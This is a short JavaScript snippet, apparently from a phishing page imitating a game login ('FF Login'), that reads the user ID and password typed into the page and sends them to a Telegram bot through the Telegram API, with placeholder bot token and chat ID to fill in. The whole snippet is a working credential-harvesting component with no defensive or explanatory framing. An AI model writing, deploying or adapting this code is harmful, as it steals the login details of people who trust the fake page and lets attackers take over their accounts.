function sendToTelegram() {
  const uid = document.getElementById("uid").value;
  const pass = document.getElementById("pass").value;

  const message = `FF Login\nUser: ${uid}\nPass: ${pass}`;
  const token = "YOUR_BOT_TOKEN";
  const chatId = "YOUR_CHAT_ID";

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => alert("Sent to Telegram!"))
    .catch(error => alert("Failed to send"));
}
